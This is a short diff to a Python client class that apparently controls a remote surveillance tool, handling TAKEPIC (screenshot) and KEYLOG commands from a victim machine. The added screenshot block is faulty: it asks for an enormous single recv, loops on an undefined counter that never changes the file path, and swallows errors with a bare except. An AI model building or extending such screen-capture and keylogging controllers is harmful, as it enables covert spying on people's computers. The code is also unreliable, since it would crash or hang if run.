@@ -104,7 +104,7 @@ class Client:
             # tk.Label(self.root, text=data).pack()
         elif res == "TAKEPIC":
             # Receive image data from the server
-            data = self.receive_data()
+            #data = self.receive_data()
             # self.gui.ScreenshotScene
             # gui.GUI.ScreenshotScene
             # size = int(self.Cli_Sock.recv(10).decode('utf-8'))
@@ -118,6 +118,15 @@ class Client:
 
             # Display data in a tkinter widget
             # tk.Label(self.root, text=data).pack()
+            try:
+                data = self.recv(1310720000)
+                data = Image.frombytes('RGB', (1280, 720), data)
+                while os.path.exists(r'D:\screenshot.png') == True:
+                    n += 1
+                data.save(r'D:\screenshot.png')
+                data.show()
+            except:
+                print('Screenshot has been failed')
                         
         elif res == "KEYLOG":
             data = self.receive_data()
